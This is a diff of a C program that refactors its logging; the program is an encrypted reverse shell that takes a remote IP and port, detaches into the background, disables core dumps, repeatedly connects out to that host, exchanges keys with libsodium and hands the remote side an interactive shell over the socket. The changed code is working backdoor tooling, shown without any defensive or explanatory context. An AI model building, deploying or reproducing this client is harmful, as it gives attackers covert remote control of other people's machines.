@@ -20,7 +20,8 @@
 #include <sodium.h>
 
 #include "misc.h"
-#include "../../cryptwrapper/include/wrapper.h"
+#include "logger.h"
+#include "wrapper.h"
 
 #define IP_LEN 16
 
@@ -44,33 +45,49 @@ struct connection {
 
 int setupcon(struct connection *con)
 {
+	int rv;
+
 	con->sock = socket(PF_INET, SOCK_STREAM, 0);
 	if (con->sock < 0) {
+		ERR(con->sock);
 		return -1;
 	}
 
 	// setup input pipe
-	if (pipe(con->procin)) {
+	rv = pipe(con->procin);
+	if (rv) {
+		ERR(rv);
 		return -2;
 	}
 
-	if (fcntl(con->procin[0], F_SETFL, O_NONBLOCK)) {
+	rv = fcntl(con->procin[0], F_SETFL, O_NONBLOCK);
+	if (rv) {
+		ERR(rv);
 		return -3;
 	}
 
-	if (fcntl(con->procin[1], F_SETFL, O_NONBLOCK)) {
+	rv = fcntl(con->procin[1], F_SETFL, O_NONBLOCK);
+	if (rv) {
+		ERR(rv);
 		return -4;
 	}
 
 	// setup output pipe
-	if (pipe(con->procout)) {
+	rv = pipe(con->procout);
+	if (rv) {
+		ERR(rv);
 		return -5;
 	}
 
-	if (fcntl(con->procout[0], F_SETFL, O_NONBLOCK)) {
+	rv = fcntl(con->procout[0], F_SETFL, O_NONBLOCK);
+	if (rv) {
+		ERR(rv);
 		return -6;
 	}
-	if (fcntl(con->procout[1], F_SETFL, O_NONBLOCK)) {
+
+	rv = fcntl(con->procout[1], F_SETFL, O_NONBLOCK);
+	if (rv) {
+		ERR(rv);
 		return -7;
 	}
 
@@ -79,8 +96,8 @@ int setupcon(struct connection *con)
 		int var = 1;
 		socklen_t len = sizeof var;
 
-		if (setsockopt(con->sock, SOL_SOCKET, SO_KEEPALIVE, &var,
-			       len)) {
+		rv = setsockopt(con->sock, SOL_SOCKET, SO_KEEPALIVE, &var, len);
+		if (rv) {
 			return 9;
 		}
 	}
@@ -97,15 +114,23 @@ int setupcon(struct connection *con)
 
 int closecon(struct connection *con)
 {
-	if (closepipe(con->procin)) {
+	int rv;
+
+	rv = closepipe(con->procin);
+	if (rv) {
+		ERR(rv);
 		return -1;
 	}
 
-	if (closepipe(con->procout)) {
+	rv = closepipe(con->procout);
+	if (rv) {
+		ERR(rv);
 		return -2;
 	}
 
-	if (close(con->sock)) {
+	rv = close(con->sock);
+	if (rv) {
+		ERR(rv);
 		return -3;
 	}
 	return 0;
@@ -113,6 +138,7 @@ int closecon(struct connection *con)
 
 void *relay(void *data)
 {
+	int rv;
 	int len;
 	struct connection *con = (struct connection *)data;
 
@@ -120,7 +146,9 @@ void *relay(void *data)
 
 	con->relayrv = 0;
 
-	if (fcntl(con->sock, F_SETFL, O_NONBLOCK)) {
+	rv = fcntl(con->sock, F_SETFL, O_NONBLOCK);
+	if (rv) {
+		ERR(rv);
 		con->relayrv = 1;
 		return NULL;
 	}
@@ -137,10 +165,10 @@ void *relay(void *data)
 				con->relayrv = -2;
 				return NULL;
 			}
-			dbprintf("written:%s\n", buff);
+			LOG(1, "written:%s\n", buff);
 
 		} else if (len < 0) {
-			dbprintf("recv_encrypted failed with %d!\n", len);
+			ERR(len);
 		}
 
 		memset(buff, 0, TRANS_BUFF_SIZE);
@@ -153,9 +181,9 @@ void *relay(void *data)
 		}
 
 		if (len > 0) {
-			if (send_encrypted(con->sock, &con->ctx, buff) < 0) {
-				dbprintf("send_encrypted failed with %d!\n",
-					 len);
+			rv = send_encrypted(con->sock, &con->ctx, buff);
+			if (rv < 0) {
+				ERR(rv);
 			}
 		}
 
@@ -178,17 +206,17 @@ int spawnconsole(struct connection *con)
 	const size_t shells_size = 6;
 
 	// Search for a working shell
-	dbprint("Searching for shells...\n");
+	LOG(1, "Searching for shells...\n");
 	for (i = 0; i < shells_size; i++) {
 		if (access(shells[i], F_OK) == 0) {
-			dbprintf("Found shell %s!\n", shells[i]);
+			LOG(0, "Found shell %s!\n", shells[i]);
 			break;
 		}
-		dbprintf("Shell %s no good...\n", shells[i]);
+		LOG(1, "Shell %s no good...\n", shells[i]);
 	}
 
 	if (i == shells_size) {
-		dbprint("No shell found!\n");
+		LOG(-1, "No shell found!\n");
 		return -1;
 	}
 
@@ -200,12 +228,12 @@ int spawnconsole(struct connection *con)
 		pid = fork();
 		if (pid == 0) {
 			// As child
-			dbprint("Closing unneeded fds...\n");
+			LOG(1, "Closing unneeded fds...\n");
 			if (close(con->procout[0]) | close(con->procin[1])) {
 				return -1;
 			}
 
-			dbprint("Dupping i/o fds...\n");
+			LOG(1, "Dupping i/o fds...\n");
 			if (dup2(con->procin[0], STDIN_FILENO) < 0) {
 				return -2;
 			}
@@ -218,7 +246,7 @@ int spawnconsole(struct connection *con)
 				return -4;
 			}
 
-			dbprint("Forking shell...\n");
+			LOG(1, "Forking shell...\n");
 			if (execv(shells[i], argv) < 0) {
 				return -5;
 			}
@@ -238,23 +266,24 @@ int spawnconsole(struct connection *con)
 		if (pthread_create(&thread, NULL, relay, con)) {
 			return -9;
 		}
-		dbprint("Created relay thread!\n");
+		LOG(0, "Created relay thread!\n");
 
 		// Wait for shell to exit
 		while (1) {
 			if (con->exit) {
 				// Try to kill the process
-				if (kill(pid, SIGKILL)) {
-					dbprint("Killing shell failed!\n");
+				rv = kill(pid, SIGKILL);
+				if (rv) {
+					ERR(rv);
 					return -10;
 				}
-				dbprint("Killed shell!\n");
+				LOG(1, "Killed shell!\n");
 			}
 
 			if (waitpid(pid, &rv, WNOHANG) >= 0) {
 				if (WIFEXITED(rv)) {
-					dbprintf("Shell process returned %d\n",
-						 WEXITSTATUS(rv));
+					LOG(1, "Shell process returned %d\n",
+					    WEXITSTATUS(rv));
 					break;
 				}
 			} else {
@@ -270,7 +299,7 @@ int spawnconsole(struct connection *con)
 		if (pthread_join(thread, NULL)) {
 			return -13;
 		}
-		dbprintf("Relay thread returned %d\n", con->relayrv);
+		LOG(1, "Relay thread returned %d\n", con->relayrv);
 	}
 	return 0;
 }
@@ -307,7 +336,7 @@ int argparse(int argc, char *argv[], struct connection *con)
 			if (i + 1 <= argc) {
 				memcpy(con->ip, argv[i + 1], IP_LEN);
 			} else {
-				dbprint("Invalid IP Address given!\n");
+				LOG(1, "Invalid IP Address given!\n");
 			}
 			break;
 
@@ -317,7 +346,8 @@ int argparse(int argc, char *argv[], struct connection *con)
 
 				temp = longparse(argv[i + 1], NULL);
 				if (temp > UINT16_MAX || temp < 1) {
-					dbprint("Invalid argument given to -p option\n");
+					LOG(1,
+					    "Invalid argument given to -p option\n");
 					return 1;
 				} else {
 					con->port = temp;
@@ -328,7 +358,8 @@ int argparse(int argc, char *argv[], struct connection *con)
 	}
 
 	if (con->port == 0 || con->ip[0] == '\0') {
-		dbprint("Invalid argument provided!\n[ -p <port> -i <remote_IP> ]\n");
+		LOG(1,
+		    "Invalid argument provided!\n[ -p <port> -i <remote_IP> ]\n");
 		return 1;
 	}
 	return 0;
@@ -350,15 +381,16 @@ int main(int argc, char *argv[])
 		limit.rlim_cur = 0;
 		limit.rlim_max = 0;
 
-		if (setrlimit(RLIMIT_CORE, &limit)) {
-			dbprint("setrlimit\n");
+		rv = setrlimit(RLIMIT_CORE, &limit);
+		if (rv) {
+			ERR(rv);
 			return -2;
 		}
 	}
 
 	rv = argparse(argc, argv, &con);
 	if (rv) {
-		dbprintf("argparse:%d\n", rv);
+		LOG(-1, "argparse:%d\n", rv);
 		return -4;
 	}
 
@@ -366,7 +398,7 @@ int main(int argc, char *argv[])
 #ifndef DEBUG
 	rv = forkoff();
 	if (rv) {
-		dbprintf("forkoff: %d\n", rv);
+		LOG(-1, "forkoff: %d\n", rv);
 		return -5;
 	}
 #endif
@@ -377,12 +409,12 @@ int main(int argc, char *argv[])
 			// setup a connection
 			rv = setupcon(&con);
 			if (rv) {
-				dbprintf("setupcon:%d\n", rv);
+				LOG(-1, "setupcon:%d\n", rv);
 				return -6;
 			}
 
 			// try to connect
-			dbprintf("Connecting to %s:%d\n", con.ip, con.port);
+			LOG(0, "Connecting to %s:%d\n", con.ip, con.port);
 			rv = 1;
 			while (rv) {
 				rv = connect(con.sock,
@@ -395,7 +427,7 @@ int main(int argc, char *argv[])
 					return -7;
 				}
 			}
-			dbprint("Connected!\n");
+			LOG(0, "Connected!\n");
 
 			// keyexchange between client and server
 			rv = keyexchange(con.sock, &con.ctx, true);
@@ -403,19 +435,19 @@ int main(int argc, char *argv[])
 				dbprintf("keyexchange:%d\n", rv);
 				return -9;
 			}
-			dbprint("Authentication complete!\n");
+			LOG(0, "Authentication complete!\n");
 
 			// spawn console / dups fds so that shell is usable over the sock
 			rv = spawnconsole(&con);
 			if (rv) {
-				dbprintf("spawnconsole:%d\n", rv);
+				LOG(-1, "spawnconsole:%d\n", rv);
 				return -10;
 			}
 
 			// close connection
 			rv = closecon(&con);
 			if (rv) {
-				dbprintf("closecon:%d\n", rv);
+				LOG(-1, "closecon:%d\n", rv);
 				return -11;
 			}
 
